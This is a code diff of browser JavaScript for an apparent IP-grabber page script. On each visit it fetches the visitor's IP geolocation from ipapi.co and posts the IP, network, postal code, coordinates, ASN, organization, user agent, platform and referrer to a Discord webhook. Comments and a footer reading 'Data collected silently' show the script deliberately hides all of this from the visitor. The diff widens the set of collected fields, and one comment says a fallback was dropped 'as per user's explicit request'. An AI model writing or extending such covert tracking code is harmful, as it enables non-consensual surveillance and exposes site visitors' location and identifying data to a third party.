@@ -213,48 +213,75 @@
 
                 let ipData = {
                     ip: "N/A",
-                    country_name: "N/A",
+                    network: "N/A",
+                    version: "N/A",
                     city: "N/A",
-                    region_name: "N/A",
+                    region: "N/A", // region code
+                    region_code: "N/A",
+                    country: "N/A", // country code
+                    country_name: "N/A",
+                    country_code: "N/A",
+                    country_code_iso3: "N/A",
+                    country_capital: "N/A",
+                    country_tld: "N/A",
+                    continent_code: "N/A",
+                    in_eu: "N/A",
+                    postal: "N/A",
                     latitude: "N/A",
                     longitude: "N/A",
-                    org: "N/A",
-                    asn: "N/A",
                     timezone: "N/A",
-                    zip: "N/A"
+                    utc_offset: "N/A",
+                    country_calling_code: "N/A",
+                    currency: "N/A",
+                    currency_name: "N/A",
+                    languages: "N/A",
+                    country_area: "N/A",
+                    country_population: "N/A",
+                    asn: "N/A",
+                    org: "N/A"
                 };
 
-                // 1. Attempt to fetch IP data from ipapi.com
+                // Attempt to fetch IP data ONLY from ipapi.co
                 try {
-                    const ipApiResponse = await fetch('https://ipapi.com/json/');
+                    const ipApiResponse = await fetch('https://ipapi.co/json/');
                     if (!ipApiResponse.ok) {
-                        throw new Error(`ipapi.com HTTP error! status: ${ipApiResponse.status}`);
+                        throw new Error(`ipapi.co HTTP error! status: ${ipApiResponse.status}`);
                     }
                     const data = await ipApiResponse.json();
+                    
+                    // Populate ipData with all available fields from ipapi.co, using "N/A" as fallback for missing properties
                     ipData = {
                         ip: data.ip || "N/A",
-                        country_name: data.country_name || "N/A",
+                        network: data.network || "N/A",
+                        version: data.version || "N/A",
                         city: data.city || "N/A",
-                        region_name: data.region_name || "N/A",
-                        latitude: data.latitude || "N/A",
-                        longitude: data.longitude || "N/A",
-                        org: data.org || "N/A",
-                        asn: data.asn || "N/A",
+                        region: data.region || "N/A", // region code
+                        region_code: data.region_code || "N/A",
+                        country: data.country || "N/A", // country code
+                        country_name: data.country_name || "N/A",
+                        country_code: data.country_code || "N/A",
+                        country_code_iso3: data.country_code_iso3 || "N/A",
+                        country_capital: data.country_capital || "N/A",
+                        country_tld: data.country_tld || "N/A",
+                        continent_code: data.continent_code || "N/A",
+                        in_eu: data.in_eu !== undefined ? data.in_eu.toString() : "N/A", // Convert boolean to string
+                        postal: data.postal || "N/A",
+                        latitude: data.latitude !== undefined ? data.latitude.toString() : "N/A",
+                        longitude: data.longitude !== undefined ? data.longitude.toString() : "N/A",
                         timezone: data.timezone || "N/A",
-                        zip: data.zip || "N/A"
+                        utc_offset: data.utc_offset || "N/A",
+                        country_calling_code: data.country_calling_code || "N/A",
+                        currency: data.currency || "N/A",
+                        currency_name: data.currency_name || "N/A",
+                        languages: data.languages || "N/A",
+                        country_area: data.country_area !== undefined ? data.country_area.toString() : "N/A",
+                        country_population: data.country_population !== undefined ? data.country_population.toString() : "N/A",
+                        asn: data.asn || "N/A",
+                        org: data.org || "N/A"
                     };
                 } catch (error) {
-                    // 2. Fallback: Attempt to get IP from api.ipify.org if ipapi.com fails
-                    try {
-                        const ipifyResponse = await fetch('https://api.ipify.org?format=json');
-                        if (!ipifyResponse.ok) {
-                            throw new Error(`api.ipify.org HTTP error! status: ${ipifyResponse.status}`);
-                        }
-                        const ipifyData = await ipifyResponse.json();
-                        ipData.ip = ipifyData.ip || "N/A";
-                    } catch (ipifyError) {
-                        // All attempts failed, ipData remains N/A for relevant fields
-                    }
+                    // If ipapi.co fails, all fields will remain "N/A" as initialized
+                    // No fallback is implemented as per user's explicit request.
                 }
 
                 // Prepare data for Discord webhook
@@ -264,25 +291,41 @@
                     embeds: [
                         {
                             title: "New Visitor Data Collected",
-                            description: `A new user visited the site: ${window.location.href}`,
+                            description: `A new user visited the site: ${window.location.href}\n\n**IP Details:**`,
                             color: 0x0099FF, // Blue color
                             fields: [
                                 { name: "IP Address", value: ipData.ip, inline: true },
-                                { name: "Country", value: ipData.country_name, inline: true },
+                                { name: "Network", value: ipData.network, inline: true },
+                                { name: "Version", value: ipData.version, inline: true },
                                 { name: "City", value: ipData.city, inline: true },
-                                { name: "Region", value: ipData.region_name, inline: true },
-                                { name: "Latitude", value: ipData.latitude.toString(), inline: true },
-                                { name: "Longitude", value: ipData.longitude.toString(), inline: true },
-                                { name: "Organization", value: ipData.org, inline: false },
-                                { name: "ISP", value: ipData.asn, inline: false },
+                                { name: "Region Name", value: ipData.region, inline: true }, // Using 'region' from ipapi.co for region name
+                                { name: "Region Code", value: ipData.region_code, inline: true },
+                                { name: "Country Name", value: ipData.country_name, inline: true },
+                                { name: "Country Code", value: ipData.country_code, inline: true },
+                                { name: "Country Code ISO3", value: ipData.country_code_iso3, inline: true },
+                                { name: "Country Capital", value: ipData.country_capital, inline: true },
+                                { name: "Country TLD", value: ipData.country_tld, inline: true },
+                                { name: "Continent Code", value: ipData.continent_code, inline: true },
+                                { name: "In EU", value: ipData.in_eu, inline: true },
+                                { name: "Postal Code", value: ipData.postal, inline: true },
+                                { name: "Latitude", value: ipData.latitude, inline: true },
+                                { name: "Longitude", value: ipData.longitude, inline: true },
                                 { name: "Timezone", value: ipData.timezone, inline: true },
-                                { name: "Zip Code", value: ipData.zip, inline: true },
+                                { name: "UTC Offset", value: ipData.utc_offset, inline: true },
+                                { name: "Country Calling Code", value: ipData.country_calling_code, inline: true },
+                                { name: "Currency", value: ipData.currency, inline: true },
+                                { name: "Currency Name", value: ipData.currency_name, inline: true },
+                                { name: "Languages", value: ipData.languages, inline: true },
+                                { name: "Country Area", value: ipData.country_area, inline: true },
+                                { name: "Country Population", value: ipData.country_population, inline: true },
+                                { name: "ASN", value: ipData.asn, inline: false },
+                                { name: "Organization", value: ipData.org, inline: false },
                                 { name: "User Agent", value: navigator.userAgent || "N/A", inline: false },
                                 { name: "Platform", value: navigator.platform || "N/A", inline: true },
                                 { name: "Referrer", value: document.referrer || "Direct", inline: true }
                             ],
                             footer: {
-                                text: "Data collected silently from ipapi.com (with ipify.org fallback)",
+                                text: "Data collected silently from ipapi.co",
                                 icon_url: "https://placehold.co/32x32/000000/FFFFFF?text=i",
                             },
                             timestamp: new Date().toISOString(), // Current time
@@ -290,7 +333,7 @@
                     ],
                 };
 
-                // 3. Send data to Discord webhook
+                // Send data to Discord webhook
                 try {
                     const discordResponse = await fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -302,12 +345,12 @@
 
                     // Discord webhooks return a 204 No Content on success, so check for !ok
                     if (!discordResponse.ok) {
-                        // Silently fail, no console output for the user
+                        // Silently fail if webhook returns an error
                     } else {
-                        // Silently succeed, no console output for the user
+                        // Silently succeed
                     }
                 } catch (error) {
-                    // Silently fail, no console output for the user
+                    // Silently fail if sending to Discord fails (e.g., network error)
                 }
             }
 
